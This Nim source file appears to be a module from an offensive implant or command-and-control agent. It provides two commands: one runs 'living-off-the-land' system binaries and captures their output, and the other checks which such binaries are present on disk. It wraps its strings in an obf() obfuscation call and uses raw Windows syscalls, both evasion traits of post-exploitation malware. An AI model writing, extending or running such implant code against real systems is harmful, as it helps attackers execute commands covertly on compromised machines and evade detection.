import std/json
import std/strutils
import ../../utils/global
import ../execution/core
import ./utils
from ../../utils/winapi/syscall import ntCloseHandle

proc load_lol_bin*(args, input, params: string; buf: var openArray[char]): int =
  # Runs a listed binary and captures its output
  discard input

  var binPath = ""
  var extra = ""
  var pid: uint32 = 0
  try:
    let p = parseJson(params)
    if p.hasKey(obf("bin")):
      binPath = p[obf("bin")].getStr().strip(chars = {'"', '\''})
    if p.hasKey(obf("args")):
      extra = p[obf("args")].getStr().strip(chars = {'"', '\''})
    if p.hasKey(obf("pid")):
      let n = p[obf("pid")]
      if n.kind == JInt:
        pid = uint32(n.getInt())
      else:
        pid = uint32(parseInt(n.getStr()))
  except Exception:
    discard

  if binPath.len == 0:
    return writeErr(obf("missing --bin path"), buf)
  if extra.len == 0 and args.strip().len > 0:
    extra = args.strip()

  binPath = placeholder_resolve(binPath)
  if binPath.find('<') >= 0:
    return writeErr(obf("binary path not found, try to use --path to specify the path"), buf)

  if pid > 0:
    let procH = open_pid_query(pid)
    if procH == nil:
      return writeErr(obf("NtOpenProcess failed"), buf)
    discard ntCloseHandle(procH)

  if not path_exists(binPath):
    return writeErr(obf("binary path not found, try to use --path to specify the path"), buf)

  let n = run_bin_capture(binPath, extra, buf)
  if n == -1:
    return writeErr(obf("command too long"), buf)
  if n == -2:
    return writeErr(obf("CreatePipe failed"), buf)
  if n == -3:
    return writeErr(obf("CreateProcess failed"), buf)
  if n > 0:
    n
  else:
    writeMsg(obf("Process finished (no output)."), buf)

proc check_lol_bins*(args, input, params: string; buf: var openArray[char]): int =
  # Checks which listed binaries exist on disk
  discard args
  discard input
  var bins: JsonNode
  try:
    let p = parseJson(params)
    if not p.hasKey(obf("bins_path")):
      return writeErr(obf("missing --bins-path"), buf)
    bins = p[obf("bins_path")]
    if bins.kind == JString:
      var raw = bins.getStr().strip(chars = {'"', '\''})
      bins = parseJson(raw)
  except Exception:
    return writeErr(obf("invalid parameters"), buf)

  if bins.kind != JObject:
    return writeErr(obf("--bins-path must be a JSON object"), buf)

  type FoundRow = tuple[name, path: string]
  var found: seq[FoundRow] = @[]
  for name, node in bins.pairs:
    if node.kind != JString:
      continue
    var tpl = node.getStr().strip(chars = {'"', '\''})
    if tpl.len == 0:
      continue
    let resolved = placeholder_resolve(tpl)
    if resolved.find('<') >= 0:
      continue
    if not path_exists(resolved):
      continue
    found.add((name, resolved))

  var nameWidth = 0
  for row in found:
    if row.name.len > nameWidth:
      nameWidth = row.name.len

  var lines: seq[string] = @[]
  for row in found:
    lines.add(row.name.alignLeft(nameWidth) & "  " & row.path)

  writeMsg(obf("FOUND:\n\n") & lines.join("\n") & (if lines.len >
      0: "\n" else: ""), buf)
